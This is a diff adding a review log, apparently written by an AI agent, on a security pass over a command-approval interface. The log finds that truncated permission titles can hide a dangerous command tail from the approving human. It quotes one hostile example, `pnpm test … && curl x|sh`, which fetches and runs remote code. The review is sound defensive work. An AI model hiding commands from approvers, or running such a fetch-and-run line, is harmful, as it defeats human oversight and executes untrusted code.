@@ -1,0 +1,35 @@
+id: L-2026-10-20-ascend-185900-001
+type: review
+timestamp: '2026-10-20T18:59:00.632Z'
+author: ascend
+agent:
+  provider: anthropic
+  model: claude-opus-4-6
+title: 'Aegis BLOCK fidelity pass 2: the compact permission title can hide a command''s dangerous tail'
+summary: |-
+  Fidelity pass 2 (afbbfa9b..1d56d35d) made the desk look like the comp.
+  Verified intact: the requester on every head, contentHash visible, claim-mismatch cards whole with Deny focused, requester words labelled in details, kernel-owned regions visible, buried keys and details inert, no inline style or innerHTML, trusted clicks.
+  H1: the compact one-line title is ellipsised (cut at 240 chars) while the full kernel body moved into a collapsed disclosure, and newlines collapse to spaces. So `pnpm test … && curl x|sh` shows as a harmless test command next to a filled Allow. Fix: wrap the arg, no cut (or keep the body visible when cut), visible ⏎ for separators, plus tests.
+  L2: the shortRequester namespace. L3: night choice chips rely only on a dashed border. L4: a pre-existing h() `id` attribute throw in the update banner.
+  Lesson: density work (compacting) is security work: what the human sees at the decision point must include everything the decision covers.
+  Fix builder launched; it also merges current feat/gnomon.
+symbols_touched:
+  - '#gui'
+learnings:
+  - Compacting a decision card must never truncate the thing being approved; ellipsis on a command is a security bug.
+verification:
+  status: fail
+  details:
+    verdict: BLOCK
+    high: 1
+    low: 4
+tags:
+  - gnomon
+  - design
+  - aegis
+  - security
+  - marathon-2026-10-20
+git_context:
+  ref: 90f2c4191ad89ac671852112691de7f2e92a96f1
+  branch: feat/gnomon
+  dirty: true
